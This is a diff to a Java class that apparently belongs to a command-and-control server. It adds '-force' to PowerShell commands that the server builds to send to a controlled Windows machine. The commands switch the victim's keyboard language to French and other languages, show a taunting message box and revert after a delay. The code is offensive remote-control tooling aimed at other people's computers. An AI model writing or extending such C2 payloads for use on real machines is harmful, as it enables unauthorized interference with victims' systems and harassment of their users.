@@ -325,7 +325,7 @@ public class C2ServerUserHandler implements Runnable{
                     String target = userInputScanner.nextLine();
                     // Set their Keybaord language to French for 60 seconds, then change it back to English
                     String commands = "";
-                    commands += "Set-WinUserLanguageList fr-FR;";
+                    commands += "Set-WinUserLanguageList fr-FR -force;";
                     commands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
                     commands += "[System.Windows.MessageBox]::Show('Have Fun Learning French MF');";
                     commands += "Start-Sleep -Seconds 60;";
@@ -344,7 +344,7 @@ public class C2ServerUserHandler implements Runnable{
                     languages.put("Cantonese", "zh-HK");
                     languages.put("Italian","it-IT");
                     for(String language : languages.keySet()){
-                        commands += "Set-WinUserLanguageList " + languages.get(language) + ";";
+                        commands += "Set-WinUserLanguageList " + languages.get(language) + " -force;";
                         commands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
                         commands += "[System.Windows.MessageBox]::Show('Have Fun Learning " + language + " MF');";
                         commands += "Start-Sleep -Seconds 30;";
